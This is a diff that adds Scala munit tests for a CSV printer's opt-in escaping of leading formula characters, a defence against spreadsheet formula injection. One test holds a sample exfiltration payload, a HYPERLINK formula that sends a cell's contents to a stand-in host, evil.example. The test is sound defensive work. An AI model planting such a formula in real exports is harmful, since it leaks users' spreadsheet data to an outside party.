@@ -38,4 +38,50 @@ class PrinterSpec extends munit.FunSuite {
 
     assertEquals(Printer.default.print(csv), expectedCSVString)
   }
+
+  test("default printer leaves formula-looking values alone") {
+    // The default must not change what it emits; escaping is opt-in.
+    assertEquals(Printer.default.print(CSV.Field("=1+1")), "=1+1")
+    assertEquals(Printer.default.print(CSV.Field("+1")), "+1")
+    assertEquals(Printer.default.print(CSV.Field("-1")), "-1")
+    assertEquals(Printer.default.print(CSV.Field("@SUM(A1)")), "@SUM(A1)")
+  }
+
+  test("formula-escaping printer prefixes values a spreadsheet would evaluate") {
+    val p = Printer.defaultEscapingFormulas
+    assertEquals(p.print(CSV.Field("=1+1")), "'=1+1")
+    assertEquals(p.print(CSV.Field("+1")), "'+1")
+    assertEquals(p.print(CSV.Field("-1")), "'-1")
+    assertEquals(p.print(CSV.Field("@SUM(A1)")), "'@SUM(A1)")
+  }
+
+  test("formula-escaping printer guards the classic exfiltration payload") {
+    val payload = """=HYPERLINK("http://evil.example/?"&A1,"click")"""
+    val printed = Printer.defaultEscapingFormulas.print(CSV.Field(payload))
+    // The payload contains quotes, so it is also RFC 4180 surrounded; the
+    // formula guard belongs inside that surrounding.
+    assert(printed.startsWith("\"'="), s"formula not neutralised: $printed")
+  }
+
+  test("formula-escaping printer leaves ordinary values untouched") {
+    val p = Printer.defaultEscapingFormulas
+    assertEquals(p.print(CSV.Field("Pizza")), "Pizza")
+    assertEquals(p.print(CSV.Field("1")), "1")
+    // A formula character that is not leading is not a formula.
+    assertEquals(p.print(CSV.Field("A=B")), "A=B")
+  }
+
+  test("formula escaping composes with RFC 4180 surrounding") {
+    // The added quote belongs inside the surrounding quotes, not outside.
+    val printed = Printer.defaultEscapingFormulas.print(CSV.Field("=1,2"))
+    assertEquals(printed, "\"'=1,2\"")
+  }
+
+  test("headers are escaped too") {
+    assertEquals(Printer.defaultEscapingFormulas.print(CSV.Header("=1+1")), "'=1+1")
+  }
+
+  test("tsv variant escapes formulas as well") {
+    assertEquals(Printer.tsvEscapingFormulas.print(CSV.Field("=1+1")), "'=1+1")
+  }
 }
